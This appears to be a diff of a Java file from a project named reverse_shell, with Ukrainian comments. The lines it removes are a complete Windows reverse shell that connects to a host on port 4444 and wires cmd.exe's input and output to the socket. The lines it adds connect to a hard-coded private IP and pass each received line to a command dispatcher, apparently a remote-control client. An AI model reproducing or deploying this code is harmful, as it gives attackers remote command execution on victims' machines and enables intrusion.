@@ -1,53 +1,25 @@
-import java.io.InputStream;
-import java.io.OutputStream;
+package reverse_shell;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.net.Socket;
 
 public class Main {
     public static void main(String[] args) {
-        String host = "ТВОЙ_IP_АДРЕС"; // Замініть на свій IP
+        String host = "192.168.1.184"; // Заміни на свою IP-адресу
         int port = 4444;
 
         try {
             Socket socket = new Socket(host, port);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+            Dispatcher dispatcher = new Dispatcher();
 
-            Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
+            String input;
+            while ((input = reader.readLine()) != null) {
+                dispatcher.dispatch(input, socket);
+            }
 
-            InputStream processIn = process.getInputStream();
-            OutputStream processOut = process.getOutputStream();
-            InputStream socketIn = socket.getInputStream();
-            OutputStream socketOut = socket.getOutputStream();
-
-            Thread t1 = new Thread(() -> {
-                try {
-                    int read;
-                    byte[] buffer = new byte[1024];
-                    while ((read = processIn.read(buffer)) != -1) {
-                        socketOut.write(buffer, 0, read);
-                        socketOut.flush();
-                    }
-                } catch (Exception ignored) {}
-            });
-
-            Thread t2 = new Thread(() -> {
-                try {
-                    int read;
-                    byte[] buffer = new byte[1024];
-                    while ((read = socketIn.read(buffer)) != -1) {
-                        processOut.write(buffer, 0, read);
-                        processOut.flush();
-                    }
-                } catch (Exception ignored) {}
-            });
-
-            t1.start();
-            t2.start();
-
-            t1.join();
-            t2.join();
-
-            process.destroy();
             socket.close();
-
         } catch (Exception e) {
             e.printStackTrace();
         }
